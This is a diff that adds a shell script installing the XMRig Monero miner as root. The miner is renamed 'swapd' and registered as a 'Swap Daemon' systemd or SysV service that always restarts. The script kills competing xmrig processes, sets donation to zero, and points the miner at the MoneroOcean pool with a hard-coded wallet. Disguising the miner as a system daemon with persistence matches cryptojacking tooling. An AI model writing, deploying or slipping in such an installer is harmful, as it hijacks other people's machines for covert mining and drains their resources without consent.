@@ -1,0 +1,140 @@
+cat > /tmp/miner_setup.sh << 'EOFSCRIPT'
+#!/bin/bash
+# MoneroOcean Miner - Works on Ancient Systems
+
+WALLET=$1
+EMAIL=$2
+
+if [ -z "$WALLET" ]; then
+    echo "Usage: bash /tmp/miner_setup.sh <WALLET> [EMAIL]"
+    exit 1
+fi
+
+echo "========================================================================"
+echo "MoneroOcean Miner Setup - Ancient System Installer"
+echo "========================================================================"
+
+# Detect init system
+USE_SYSV=false
+if ! command -v systemctl &> /dev/null || [ ! -d /run/systemd/system ]; then
+    USE_SYSV=true
+    echo "[*] Using SysV init (no systemd)"
+else
+    echo "[*] Using systemd"
+fi
+
+# Stop existing
+killall -9 swapd xmrig 2>/dev/null
+[ "$USE_SYSV" = true ] && /etc/init.d/swapd stop 2>/dev/null
+[ "$USE_SYSV" = false ] && systemctl stop swapd 2>/dev/null
+
+# Clean up
+rm -rf /root/.swapd
+mkdir -p /root/.swapd
+
+echo "[*] Your system cannot download from GitHub (SSL too old)"
+echo "[*] MANUAL UPLOAD REQUIRED:"
+echo ""
+echo "On another computer, run:"
+echo "  wget https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz"
+echo ""  
+echo "Then transfer to this server:"
+echo "  scp xmrig.tar.gz root@$(hostname -I | awk '{print $1}'):/tmp/"
+echo ""
+echo "Then run this script again"
+echo ""
+echo "Checking if file was already uploaded..."
+
+if [ -f /tmp/xmrig.tar.gz ]; then
+    echo "[✓] Found /tmp/xmrig.tar.gz!"
+    
+    cd /tmp
+    tar xzf xmrig.tar.gz -C /root/.swapd/ 2>/dev/null
+    
+    if [ -f /root/.swapd/xmrig ]; then
+        mv /root/.swapd/xmrig /root/.swapd/swapd
+        chmod +x /root/.swapd/swapd
+        echo "[✓] XMRig extracted"
+    else
+        echo "[ERROR] Extraction failed"
+        exit 1
+    fi
+else
+    echo "[ERROR] /tmp/xmrig.tar.gz not found!"
+    echo ""
+    echo "Please upload xmrig.tar.gz to /tmp/ and run again"
+    exit 1
+fi
+
+# Create config
+PASS=$(hostname -I | awk '{print $1}' 2>/dev/null || echo "na")
+[ -n "$EMAIL" ] && PASS="$PASS:$EMAIL"
+
+cat > /root/.swapd/config.json << EOFCFG
+{
+    "autosave": true,
+    "donate-level": 0,
+    "cpu": {"enabled": true, "huge-pages": true},
+    "pools": [{
+        "url": "gulf.moneroocean.stream:80",
+        "user": "$WALLET",
+        "pass": "$PASS",
+        "keepalive": true
+    }]
+}
+EOFCFG
+
+echo "[✓] Config created"
+
+# Create service
+if [ "$USE_SYSV" = true ]; then
+    cat > /etc/init.d/swapd << 'EOFSVC'
+#!/bin/bash
+# chkconfig: 2345 99 01
+case "$1" in
+    start)
+        nohup /root/.swapd/swapd --config=/root/.swapd/config.json > /dev/null 2>&1 &
+        echo $! > /var/run/swapd.pid
+        ;;
+    stop)
+        kill $(cat /var/run/swapd.pid 2>/dev/null) 2>/dev/null
+        killall -9 swapd 2>/dev/null
+        ;;
+    status)
+        ps aux | grep -v grep | grep swapd
+        ;;
+    *) echo "Usage: $0 {start|stop|status}"; exit 1;;
+esac
+EOFSVC
+    chmod +x /etc/init.d/swapd
+    chkconfig --add swapd 2>/dev/null
+    chkconfig swapd on 2>/dev/null
+    /etc/init.d/swapd start
+    echo "[✓] SysV service started"
+    echo "Manage: /etc/init.d/swapd {start|stop|status}"
+else
+    cat > /etc/systemd/system/swapd.service << EOFSVC
+[Unit]
+Description=Swap Daemon
+[Service]
+ExecStart=/root/.swapd/swapd --config=/root/.swapd/config.json
+Restart=always
+[Install]
+WantedBy=multi-user.target
+EOFSVC
+    systemctl daemon-reload
+    systemctl enable swapd
+    systemctl start swapd
+    echo "[✓] systemd service started"
+    echo "Manage: systemctl {start|stop|status} swapd"
+fi
+
+echo ""
+echo "========================================================================"
+echo "[✓] SETUP COMPLETE!"
+echo "========================================================================"
+EOFSCRIPT
+
+chmod +x /tmp/miner_setup.sh
+echo "Script ready! Now upload xmrig.tar.gz and run:"
+echo "  bash /tmp/miner_setup.sh 49KnuVqYWbZ5AVtWeCZpfna8dtxdF9VxPcoFjbDJz52Eboy7gMfxpbR2V5HJ1PWsq566vznLMha7k38mmrVFtwog6kugWso"
